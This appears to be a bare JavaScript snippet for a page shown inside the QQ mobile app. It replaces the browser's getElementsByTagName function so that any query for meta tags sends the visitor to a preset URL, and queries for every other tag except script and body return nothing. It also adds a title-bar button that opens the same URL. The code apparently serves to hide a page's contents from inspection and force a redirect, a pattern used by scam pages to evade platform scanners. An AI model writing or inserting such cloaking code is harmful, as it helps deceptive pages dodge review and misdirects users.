if (report == null) 
{
   var report = "https://www.baidu.com"; 
} 
var Zeptoq = document.getElementsByTagName; 
document.getElementsByTagName = function (a) { 
  if (a == "meta") { window.location.href = report; return } 
  if (a == "script" || a == "body") { return Zeptoq.call(document, a) } 
  else { return } 
}; 
  mqq.ui.setTitleButtons({ left: { title: "QQ", }, right: { title: "•••", callback: function () { mqq.ui.openUrl({ target: 2, style: 1, url: report }) } } });